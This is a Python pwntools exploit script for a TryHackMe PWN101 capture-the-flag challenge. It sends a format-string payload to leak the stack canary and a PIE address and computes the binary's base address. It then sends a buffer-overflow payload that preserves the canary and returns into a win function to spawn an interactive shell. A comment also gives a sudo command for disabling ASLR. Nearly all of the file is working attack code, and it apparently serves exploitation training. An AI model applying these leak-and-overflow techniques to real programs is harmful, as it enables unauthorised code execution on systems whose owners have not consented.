#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 7

from pwn import *
#context.log_level = 'debug'

host = "10.10.10.10"
port = 9007
#io = remote(host, port)

executable = './107'
io = process(executable)
context.binary = binary = ELF(executable)
rop = ROP(binary)

##
## Address Fuzzer Candidates
##
## Index 4  - 0xb00 - Symbol: __libc_csu_fini()
# fuzzed_relative_address = 0xb00
# fuzzed_index = 4          # Only found in local
##
## Index 17 - 0x992 - Symbol: main()
fuzzed_relative_address = 0x992
fuzzed_index = 17         # On local
# fuzzed_index = 19         # On the remote
##
## Index 13 - Canary
## Disable ASLR before running the fuzzer with:
## `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
fuzzed_canary_index = 13
##

payload1 = flat([
    ("%" + str(fuzzed_canary_index) + "$p.%" + str(fuzzed_index) + "$p").encode()
#    b"%13$p.%17$p"     # Example with %p = an address (or pointer)
#    b"%13$lX.%17$lX"   # Example with %lX = 64 bits uppercase address
])

# print('Payload #1')
io.sendlineafter(b"THM: What's your last streak? ", payload1)
io.recvuntil(b'Your current streak: ')

# Leaked memory positions
leaked = io.recvline().decode().strip().split('.')
canary_address = int(leaked[0], 16)
pie_address = int(leaked[1], 16)
info("Canary address: %#X", canary_address)
info("Pie address: %#X", pie_address)

# Calculate base address
binary.address = pie_address - fuzzed_relative_address
info("Base address: %#X", binary.address)

offset = 24
relative_ret_address = rop.ret.address   # 0x6fe
dynbamic_ret_address = binary.address + relative_ret_address

payload2 = flat([
    offset * b'A',              # Padding to overflow
    canary_address,             # Keeping canary value
    b'B' * 8,                   # Overwrite RBP
    dynbamic_ret_address,       # Any return address
    binary.symbols.get_streak   # Win function
])

# print('Payload #2')
io.sendline(payload2)

# Got Shell?
while True:
    response = io.recvline()
    # print(response)
    if response.find(b"This your last streak back") != -1:
        success("Pwned!")
        io.interactive()
        exit()
    else:
        warn(".")
